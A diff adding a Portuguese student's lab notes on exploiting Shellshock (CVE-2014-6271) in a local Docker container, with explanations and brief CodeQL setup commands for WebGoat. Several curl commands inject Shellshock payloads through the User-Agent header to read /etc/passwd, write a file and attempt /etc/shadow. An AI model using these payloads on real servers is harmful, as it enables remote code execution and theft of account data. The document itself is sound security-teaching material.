@@ -1,0 +1,126 @@
+docker run -it -p 8080:80 --name shellshock jsimao/cs-shellshock-amd64
+
+curl -i http://localhost:8080/cgi-bin/getenv.cgi
+
+
+Primeiro confirma que o servidor está ativo:
+curl -i http://localhost:8080/cgi-bin/vul.cgi
+
+
+############## 2 A
+
+Agora envia o cabeçalho User-Agent com código Shellshock:
+curl -i -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/vul.cgi
+
+🧠 2️⃣ Interpretação técnica passo a passo
+
+User-Agent: → Cabeçalho HTTP injetado pelo cliente.
+
+() { :; }; → Cria uma função bash vazia e é o gatilho da vulnerabilidade Shellshock.
+
+echo; echo; /bin/cat /etc/passwd → São os comandos arbitrários que o atacante deseja que o servidor execute.
+
+O CGI (/cgi-bin/vul.cgi) é executado pelo bash vulnerável, que interpreta o conteúdo do cabeçalho como código antes de correr o script.
+
+O comando enviado via cabeçalho HTTP User-Agent permitiu executar remotamente o comando /bin/cat /etc/passwd no servidor, obtendo o conteúdo do ficheiro.
+Isto demonstra que o bash utilizado pelo CGI é vulnerável à vulnerabilidade Shellshock (CVE-2014-6271).
+
+A vulnerabilidade ocorre porque o interpretador bash avalia variáveis de ambiente que contêm definições de funções, e qualquer código após a definição da função é executado imediatamente ao carregar o ambiente.
+
+Como o servidor Apache exporta variáveis de ambiente baseadas nos cabeçalhos HTTP, o atacante consegue injetar código malicioso nesses cabeçalhos e provocar a execução remota de comandos.
+
+O ficheiro /etc/passwd é usado tradicionalmente para listar as contas de utilizadores no sistema, e a sua leitura demonstra que o atacante conseguiu acesso de execução remota (RCE) no servidor.
+
+
+############## 2 B
+Exemplo: cria um ficheiro /tmp/pwned_by_shellshock.txt com conteúdo
+
+No teu terminal (Windows cmd ou PowerShell — usaste curl assim antes):
+
+curl -i -H "User-Agent: () { :; }; echo; echo; echo 'Exploited File' > /tmp/pwned_by_shellshock.txt" http://localhost:8080/cgi-bin/vul.cgi
+
+Notas:
+
+() { :; }; é o gatilho Shellshock.
+
+echo; echo; ajuda a preservar o formato CGI (linha vazia).
+
+O > redirecciona o output para o ficheiro /tmp/pwned_by_shellshock.txt.
+
+Entra no container e lista/mostra o ficheiro. Usa o nome do container que usaste ao arrancar (shellshock se seguiste o enunciado). Exemplo
+
+Via entrar em container:
+docker exec -it shellshock /bin/bash
+# agora estás dentro do container (prompt do bash)
+ls -l /tmp/pwned_by_shellshock.txt
+cat /tmp/pwned_by_shellshock.txt
+
+
+Via Ataque Shellshock
+curl -i -H "User-Agent: () { :; }; echo; echo; /bin/cat /tmp/pwned_by_shellshock.txt" http://localhost:8080/cgi-bin/vul.cgi
+
+
+
+
+############## 2 C
+Resposta direta
+
+Normalmente NÃO — não consegues ler /etc/shadow apenas com o exploit Shellshock, porque esse ficheiro só é legível por root.
+Só conseguirás ler /etc/shadow se, excepcionalmente, o processo CGI estiver a correr com privilégios de root (muito inseguro) ou se existirem outras fragilidades/erros de configuração que permitam elevação de privilégios ou exposição do ficheiro.
+
+Em sistemas Linux, /etc/shadow contém hashes de passwords e tem permissões restritíssimas (tipicamente -rw-r----- ou -rw-------), dono root e grupo shadow ou root.
+
+Os servidores web (Apache) e os scripts CGI normalmente correm sob um utilizador de baixo privilégio (por ex. www-data, apache, nobody), não root.
+
+Assim, mesmo que explores Shellshock e consigas execução remota de comandos, esses comandos correm com o privilégio do processo web — normalmente insuficiente para ler /etc/shadow.
+
+Exceções onde seria possível:
+
+O Apache/CGI estiver a correr como root (configuração errada).
+
+/etc/shadow tiver permissões incorretas (ex.: world-readable) — mau gerenciamento.
+
+Existir uma vulnerabilidade local que permita elevar privilégios do processo web para root (post-exploitation).
+
+O ficheiro /etc/shadow tiver sido acidentalmente copiado para um local legível (logs, backup) que o processo web possa ler.
+
+
+Ver permissões do ficheiro
+curl -i -H "User-Agent: () { :; }; echo; echo; /bin/ls -l /etc/shadow" http://localhost:8080/cgi-bin/vul.cgi
+
+Tentativa de Cat:
+curl -i -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/shadow" http://localhost:8080/cgi-bin/vul.cgi
+
+
+############## 2 D
+
+curl -i "http://localhost:8080/cgi-bin/getenv.cgi?x=%28%29%20%7B%20%3A%3B%20%7D%3B%20echo%3B%20echo%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd"
+
+
+1) Mostrar que a query string aparece como variável de ambiente
+curl -i "http://localhost:8080/cgi-bin/getenv.cgi?msg=Hello_World"
+Evidência: guarda a saída (screenshot / copy-paste) — isso mostra que o servidor exporta a query string para a variável de ambiente QUERY_STRING antes de invocar o CGI.
+
+Executámos curl -i "http://localhost:8080/cgi-bin/getenv.cgi?msg=Hello_World" e confirmámos que o servidor Apache exporta a query string como variável de ambiente: QUERY_STRING=msg=Hello_World.
+Tentámos então injetar um payload Shellshock na query string e, devido a restrições de caracteres no curl do Windows, testámos com URL-encoding. O pedido
+curl -i "http://localhost:8080/cgi-bin/vul.cgi?x=%28%29%20%7B%20%3A%3B%20%7D%3B%20echo%3B%20echo%3B%20%2Fbin%2Fcat%20%2Fetc%2Fpasswd"
+apenas devolveu a resposta normal (Hello World) e não executou o comando cat /etc/passwd. Concluímos que, embora a QUERY_STRING seja visível como variável de ambiente, neste ambiente específico não é um vetor fiável para Shellshock.
+
+
+
+
+
+Justificações técnicas: para disparar Shellshock a variável de ambiente cujo valor é importado pelo bash tem de começar por () { :; };. Se a query string estiver no formato usual key=value (por exemplo x=()), o valor não começa por () e a vulnerabilidade não é ativada. Mesmo quando tentámos enviar uma query string cujo valor começa por ()... (URL-encoded), o servidor não executou o payload — isto pode dever-se a normalizações/sanitizações do Apache/CGI ou à forma como as variáveis são passadas ao bash. Em contrapartida, a injeção via cabeçalhos HTTP (ex.: User-Agent) mostrou-se efectiva neste mesmo ambiente.
+
+
+
+cd WebGoat
+codeql database create webgoat-database --language=java --overwrite
+
+
+
+
+
+# Parte 2
+
+ql/java/ql/src/Security/CWE/CWE-798/HardcodedPasswordField.ql
